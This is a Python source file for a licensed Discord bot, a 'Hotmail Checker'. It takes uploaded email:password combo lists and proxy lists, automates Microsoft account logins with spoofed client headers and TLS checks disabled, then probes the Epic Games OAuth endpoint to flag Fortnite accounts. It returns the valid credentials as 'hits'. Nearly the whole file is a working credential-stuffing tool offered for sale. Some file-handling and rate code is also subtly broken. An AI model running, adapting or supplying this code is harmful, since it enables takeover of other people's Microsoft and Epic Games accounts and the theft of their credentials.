from itertools import cycle
import ssl
import discord
from discord.ext import commands, tasks
import aiohttp
import asyncio
import sys
import os
import io
import uuid
import hashlib
import json
from datetime import datetime, timedelta
import random

from keyauth import api, KeyAuthException

checking_in_progress = False
microsoft_hits = []
bads = []
flags = []
epic_hits = []
checked = 0
active_checks = {}
checked_combos = []

# Function to calculate MD5 checksum of a file
def get_checksum(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as file:
        for chunk in iter(lambda: file.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

# Initialize KeyAuth API
keyauthapp = api(
    name="Application Name",  # Application Name
    ownerid="Owner ID",  # Owner ID
    secret="Application Secret",  # Application Secret
    version="Application Version",  # Application Version
    hash_to_check=get_checksum(__file__),  # Application Hash
)

# Discord Bot setup
intents = discord.Intents().all()
bot = commands.Bot(command_prefix='.', intents=intents)

# Path to the JSON file where redeemed keys are stored
REDEEMED_KEYS_FILE = 'redeemed_keys.json'

# Load redeemed keys from file
def load_redeemed_keys():
    try:
        with open(REDEEMED_KEYS_FILE, 'r') as file:
            data = json.load(file)
            print(f"Loaded redeemed keys: {data}")  # Add this line
            return data
    except FileNotFoundError:
        print(f"File {REDEEMED_KEYS_FILE} not found")  # Add this line
        return {}
    except json.JSONDecodeError:
        print(f"Error decoding {REDEEMED_KEYS_FILE}")  # Add this line
        return {}

# Save redeemed keys to file
def save_redeemed_keys(data):
    with open(REDEEMED_KEYS_FILE, 'w') as file:
        json.dump(data, file, indent=4)

redeemed_users = load_redeemed_keys()


# async def check_microsoft_login(email, password, proxy, proxy_type):
#     for attempt in range(MAX_RETRIES):
#         try:
#             # Existing code here
#             ...
#         except ClientError as e:
#             if attempt == MAX_RETRIES - 1:
#                 print(f"Error occurred after {MAX_RETRIES} attempts: {str(e)}")
#                 return "Error"
#             await asyncio.sleep(1)  # Wait for 1 second before retrying
#         except Exception as e:
#             print(f"Error occurred: {str(e)}")
#             return "Error"

# Function to create a formatted embed
def create_embed(title, description, color=0x00ff00):
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_footer(text="Made by cyclone x hypesharp | discord.gg/shockwavefn")
    return embed

# Command to show help message
@bot.command()
async def helpme(ctx):
    embed = create_embed(
        "Help",
        "**Commands:**\n"
        "`.redeem <license_key>` - Redeem a license key.\n"
        "`.login` - Verify your license key.\n"
        "`.check [no = proxyless / yes = use proxies]` - Check a combo file.\n"
        "`.stop` - Stop the current checking process.\n"
        "`.help` - Show this message."
    )
    await ctx.send(embed=embed)

# Redeem command
@bot.command()
async def redeem(ctx, license_key: str):
    try:
        # Check if the license key has already been redeemed
        if any(key == license_key for key in redeemed_users.values()):
            embed = create_embed(
                "License Key Already Redeemed",
                "This license key has already been redeemed by another user.",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return

        # Validate the license key with KeyAuth
        keyauthapp.license(license_key)

        # Add the user ID and license key to redeemed_users dictionary
        redeemed_users[str(ctx.author.id)] = license_key
        save_redeemed_keys(redeemed_users)  # Save the updated dictionary to JSON

        # Assign role to user
        role_name = "Customers"  # Change this to the role you want to assign
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if role:
            await ctx.author.add_roles(role)
            embed = create_embed(
                "License Redeemed Successfully",
                f"You have successfully redeemed your license key! The '{role_name}' role has been assigned to you."
            )
        else:
            embed = create_embed(
                "License Redeemed Successfully",
                f"You have successfully redeemed your license key! However, the role '{role_name}' was not found.",
                color=0xff0000
            )

        await ctx.send(embed=embed)

    except KeyAuthException as e:
        embed = create_embed(
            "Invalid License",
            f"Your license key is invalid: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    except Exception as e:
        embed = create_embed(
            "Error Redeeming License",
            f"An error occurred while redeeming the license: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return

verified_users = {}  # To keep track of users who are verified

@bot.command()
async def login(ctx):
    user_id_str = str(ctx.author.id)

    # Check if the user has redeemed a license
    if user_id_str not in redeemed_users:
        embed = create_embed(
            "Verification Required",
            "You have not redeemed a license. Please use the `.redeem` command to get verified.",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return

    # Mark the user as verified
    verified_users[user_id_str] = True

    embed = create_embed(
        "Verification Successful",
        "You are verified! You can now use the `.check` command.",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

class ProxyType:
    HTTP = "http"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"

async def check_microsoft_login(email, password, proxy, proxy_type):
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        if proxy and proxy_type:
            if proxy_type == ProxyType.HTTP:
                proxy_url = f"http://{proxy}"
            elif proxy_type == ProxyType.SOCKS4:
                proxy_url = f"socks4://{proxy}"
            elif proxy_type == ProxyType.SOCKS5:
                proxy_url = f"socks5://{proxy}"
            else:
                raise ValueError("Invalid proxy type")
        else:
            proxy_url = None

        headers = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": str(uuid.uuid4()),
            "X-Office-Application": "145",
            "X-OneAuth-Version": "1.83.0",
            "X-Office-Platform": "Android",
            "X-Office-Platform-Version": "28",
            "Enlightened-Hrd-Client": "0",
            "X-OneAuth-AppId": "com.microsoft.outlooklite",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive"
        }

        retry = 0
        while retry < 3:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                        vm = await response.text()

                    if any(x in vm for x in ["Neither", "Both", "Placeholder", "orgId"]):
                        return "Bad Combo"
                    elif "MSAccount" in vm:
                        ua = aiohttp.http.SERVER_SOFTWARE
                        headers.update({
                            "User-Agent": ua,
                            "Pragma": "no-cache",
                            "Accept": "*/*"
                        })

                        async with session.get("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=6b3dac1d-511d-4188-b691-b2578906c67a&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAA3MOYKCMAAAwL_YUkQgiBZbBOUW5DbQAXJLOBYx8PrdecAcBHFrTORdVynm74O_JT13RXSjVfS1EVl0ETix0epdK2JF2Nd0OzKmNlZAN-ZplB9Oa0U2zBOdx8fT4CVIH1RwKe8-VE324dfsyOUqGKh76nA4I61P_4d5aUpXrILeoXrehUZtuUVmk8ieJ4khmxvRIPba5Rx8dexEbLBaog8YRx2ohAF7tDjctYu8ZjLIVilsetu8kBf3JkaDHbnczeuKSMvdrPxRiCDftKtcbO5gRkzqSVnDQ_8mNfSX698ILFRBD6i6ibWA52v8DI6Lb3DfqzgVn-eAFMN2UvqPDOskxfNRq1Fbh11bhYInkxI0RCh4xa4B7LwJKPhT8UwfKLu2ez6V0suEYBIwsFw5n_3-HP4AykxFhW4BAAA&msaoauth2=true&lc=1033&sso_reload=true", headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                            auth_response = await response.text()

                        epct = parse_value(auth_response, "epct=", "\\")
                        uaid = parse_value(auth_response, "uaid=", "\\u0026")
                        state = parse_value(auth_response, "state=", "\\u0026")
                        client_id = parse_value(auth_response, "https://login.live.com/oauth20_authorize.srf?client_id=", "\\u0026")

                        headers.update({
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Referer": "https://login.microsoftonline.com/",
                            "Sec-Fetch-Dest": "document",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-Site": "same-origin",
                            "Upgrade-Insecure-Requests": "1",
                            "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": "\"Windows\""
                        })

                        async with session.get(f"https://login.live.com/oauth20_authorize.srf?client_id={client_id}&scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&response_type=code&state={state}&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&epct={epct}&jshs=0&username={email}&login_hint={email}", headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                            login_page = await response.text()

                        ppft = parse_value(login_page, "<input type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"", "\"/>")
                        urlpost = parse_value(login_page, ",urlPost:'", "'")

                        headers.update({
                            "Accept-Encoding": "gzip, deflate, br, zstd",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Host": "login.live.com",
                            "Origin": "https://login.live.com",
                            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&response_type=code&state=H4sIAAAAAAAEAA3MOYKCMAAAwL_YUkQgiBZbBOUW5DbQAXJLOBYx8PrdecAcBHFrTORdVynm74O_JT13RXSjVfS1EVl0ETix0epdK2JF2Nd0OzKmNlZAN-ZplB9Oa0U2zBOdx8fT4CVIH1RwKe8-VE324dfsyOUqGKh76nA4I61P_4d5aUpXrILeoXrehUZtuUVmk8ieJ4khmxvRIPba5Rx8dexEbLBaog8YRx2ohAF7tDjctYu8ZjLIVilsetu8kBf3JkaDHbnczeuKSMvdrPxRiCDftKtcbO5gRkzqSVnDQ_8mNfSX698ILFRBD6i6ibWA52v8DI6Lb3DfqzgVn-eAFMN2UvqPDOskxfNRq1Fbh11bhYInkxI0RCh4xa4B7LwJKPhT8UwfKLu2ez6V0suEYBIwsFw5n_3-HP4AykxFhW4BAAA&prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=6b3dac1d511d4188b691b2578906c67a&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&epct={epct}&jshs=0&username={email}&login_hint={email}"
                        })

                        data = {
                            "login": email,
                            "loginfmt": email,
                            "passwd": password,
                            "PPFT": ppft,
                            "PPSX": "Passpor",
                            "NewUser": "1",
                            "Type": "11",
                            "LoginOptions": "1",
                            "i3": str(random.randint(1, 100000)),
                            "m1": str(random.randint(1, 100000)),
                            "i12": "1",
                            "i17": str(random.randint(1, 100000)),
                            "i18": "__Login_Strings|1,__Login_Core|1,"
                        }

                        async with session.post(urlpost, headers=headers, data=data, proxy=proxy_url, ssl=ssl_context) as response:
                            login_response = await response.text()

                        if "success" in login_response:
                            epic_url = "https://www.epicgames.com/id/api/redirect"
                            async with session.get(epic_url, headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                                epic_response = await response.text()
    
                            code = parse_value(epic_response, "authorizationCode\":\"", "\"")
                            epic_token_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
    
                            headers.update({
                                "Authorization": "basic M2xvZ29uc2xkZmdna3Nqb2xsZWxncGtmcXFhMzFqYXRoZTg6MDkyMjk5ZmItMzdmYy00ZThkLTk0YTItNmU4N2NkMGY4YjA5",
                                "Content-Type": "application/x-www-form-urlencoded"
                            })
    
                            data = {
                                "grant_type": "authorization_code",
                                "code": code,
                                "token_type": "eg1"
                            }
    
                            async with session.post(epic_token_url, headers=headers, data=data, proxy=proxy_url, ssl=ssl_context) as response:
                                token_response = await response.json()
    
                            if "success" in token_response:
                                if "access_token" in token_response:
                                    return "epic_hits"
                                else:
                                    return "microsoft_hits"
                            else:
                                return "Bad Combo"
            except Exception as e:
                retry += 1
                if retry == 3:
                    return f"Error: {str(e)}"
                await asyncio.sleep(1)

    except asyncio.TimeoutError:
        return "Proxy Timeout"
    except aiohttp.ClientProxyConnectionError:
        return "Proxy Connection Error"
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        return "Error"

def parse_value(text, start, end):
    try:
        return text.split(start)[1].split(end)[0]
    except:
        return ""

def calculate_cpm(checked, elapsed_time):
    minutes = elapsed_time.total_seconds() / 100
    return int(checked / minutes) if minutes > 0 else 0

# Command to check a combo file
@bot.command()
async def check(ctx, use_proxy: str = "yes"):
    global active_checks, microsoft_hits, bads, epic_hits, flags, checked, checked_combos
    if isinstance(ctx.channel, discord.DMChannel):
        user_id = str(ctx.author.id)
        start_time = datetime.now()

        if user_id in active_checks:
            await ctx.send("You already have a check in progress. Use `.stop` to end it.")
            return

        if user_id not in verified_users:
            embed = create_embed(
                "License Required",
                "You need to log in using the `.login` command to use this command.",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return

        embed = create_embed(
            "Upload Combo File",
            "Please upload your combo file.",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

        def check_attachments(m):
            return m.author == ctx.author and m.channel == ctx.channel and len(m.attachments) == 1

        try:
            combo_msg = await bot.wait_for('message', check=check_attachments, timeout=60.0)
        except asyncio.TimeoutError:
            await ctx.send("Timeout. Please try again.")
            return

        combo_attachment = combo_msg.attachments[0]
        combo_file_bytes = await combo_attachment.read()
        combo_file_content = combo_file_bytes.decode('utf-8').splitlines()

        proxy_list = None
        proxy_type = None

        if use_proxy.lower() == "yes":
            embed = create_embed(
                "Upload Proxy File",
                "Please upload your proxy file and specify the proxy type (HTTP, SOCKS4, or SOCKS5).",
                color=0x00ff00
            )
            await ctx.send(embed=embed)

            def check_proxy(m):
                return m.author == ctx.author and m.channel == ctx.channel and len(m.attachments) == 1 and len(m.content.split()) == 1

            try:
                proxy_msg = await bot.wait_for('message', check=check_proxy, timeout=60.0)
            except asyncio.TimeoutError:
                await ctx.send("Timeout. Please try again.")
                return

            proxy_attachment = proxy_msg.attachments[0]
            proxy_file_bytes = await proxy_attachment.read()
            proxy_list = proxy_file_bytes.decode('utf-8').splitlines()
            proxy_type = proxy_msg.content.upper()

            if proxy_type == "HTTP":
                proxy_type = ProxyType.HTTP
            elif proxy_type == "SOCKS4":
                proxy_type = ProxyType.SOCKS4
            elif proxy_type == "SOCKS5":
                proxy_type = ProxyType.SOCKS5
            else:
                await ctx.send(embed=create_embed("Invalid Proxy Type", "Please specify a valid proxy type: HTTP, SOCKS4, or SOCKS5", color=0xff0000))
                return

        embed = create_embed(
            "Hotmail Checker Results",
            "Checking in progress...",
            color=0x00ff00
        )
        embed.add_field(name="Microsoft Hits", value="0", inline=True)
        embed.add_field(name="Epic Games Hits [FN]", value="0", inline=True)
        embed.add_field(name="Bads", value="0", inline=True)
        embed.add_field(name="2FA Locked", value="0", inline=True)
        embed.add_field(name="Checked", value="0", inline=True)
        embed.add_field(name="CPM", value="0", inline=True)
        message = await ctx.send(embed=embed)

        microsoft_hits = []
        bads = []
        flags = []
        epic_hits = []
        checked = 0
        checked_combos = []

        proxy_cycle = cycle(proxy_list) if proxy_list else None
        active_checks[user_id] = True

        for line in combo_file_content:
            if user_id not in active_checks:
                break

            if ":" not in line:
                continue 

            email, password = line.split(":", 1)
            email = email.strip()
            password = password.strip()

            proxy = next(proxy_cycle) if proxy_cycle else None
            result = await check_microsoft_login(email, password, proxy, proxy_type)
            checked += 1
            checked_combos.append(f"{email}:{password}")

            if result == "epic_hits":
                epic_hits.append(line)
            elif result == "microsoft_hits":
                microsoft_hits.append(line)
            elif result == "Bad Combo":
                bads.append(line)

            elapsed_time = datetime.now() - start_time
            cpm = calculate_cpm(checked, elapsed_time)
            embed.set_field_at(0, name="Microsoft Hits {XBOX}", value=str(len(microsoft_hits)), inline=True)
            embed.set_field_at(1, name="Epic Games Hits [FN]", value=str(len(epic_hits)), inline=True)
            embed.set_field_at(2, name="Bads", value=str(len(bads)), inline=True)
            embed.set_field_at(3, name="2FA Locked", value=str(len(flags)), inline=True)
            embed.set_field_at(4, name="Checked", value=str(checked), inline=True)
            embed.set_field_at(5, name="CPM", value=str(cpm), inline=True)
            await message.edit(embed=embed)

        if user_id in active_checks:
            del active_checks[user_id]
        await send_current_results(ctx)

    else:
        await ctx.send("Please use the `.check` command in a direct message with me.")

@bot.command()
async def stop(ctx):
    user_id = str(ctx.author.id)
    if user_id not in active_checks:
        await ctx.send("You don't have an active checking process.")
        return
    
    del active_checks[user_id]
    await ctx.send("Stopping your checking process. Finalizing results...")

    # Send current results
    await send_current_results(ctx)

async def send_current_results(ctx):
    embed = create_embed(
        "Current Check Results",
        "Here are the results of the check:",
        color=0x00ff00
    )
    embed.add_field(name="Microsoft Hits {XBOX}", value=str(len(microsoft_hits)), inline=True)
    embed.add_field(name="Epic Games Hits [FN]", value=str(len(epic_hits)), inline=True)
    embed.add_field(name="Bads", value=str(len(bads)), inline=True)
    embed.add_field(name="2FA Locked", value=str(len(flags)), inline=True)
    embed.add_field(name="Epic Games {INBOX}", value=str(len(epic_hits)), inline=True)
    embed.add_field(name="Checked", value=str(checked), inline=True)
    await ctx.send(embed=embed)

    # Send result files
    with open("microsoft_hits.txt", "w") as f:
        f.write("\n".join(microsoft_hits))
    with open("epic_games_hits.txt", "w") as f:
        f.write("\n".join(epic_hits))
    with open("bads.txt", "w") as f:
        f.write("\n".join(bads))
    with open("flags.txt", "w") as f:
        f.write("\n".join(flags))
    with open("checked.txt", "w") as f:
        f.write("\n".join(checked_combos))

    await ctx.send(file=discord.File("hits.txt"))
    await ctx.send(file=discord.File("epic_games_hits.txt"))
    await ctx.send(file=discord.File("bads.txt"))
    await ctx.send(file=discord.File("flags.txt"))
    await ctx.send(file=discord.File("checked.txt"))

    # Clean up files
    os.remove("hits.txt")
    os.remove("bads.txt")
    os.remove("flags.txt")
    os.remove("epic_hits.txt")
    os.remove("checked.txt")

    # Final embed
    embed = create_embed(
        "Checking Complete",
        "The check is complete. Thank you for using Hotmail Checker!",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

@tasks.loop(minutes=5)
async def update_bot_status():
    registered_users_count = len(redeemed_users)
    status_message = f"{registered_users_count} Registered Users |.help"
    await bot.change_presence(activity=discord.Game(name=status_message))

@bot.event
async def on_ready():
    global redeemed_users
    redeemed_users = load_redeemed_keys()
    update_bot_status.start()
    print('Redeemed Users:', redeemed_users)  # Debug: Print redeemed users on startup
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')

bot.run('YOUR BOT TOKEN')
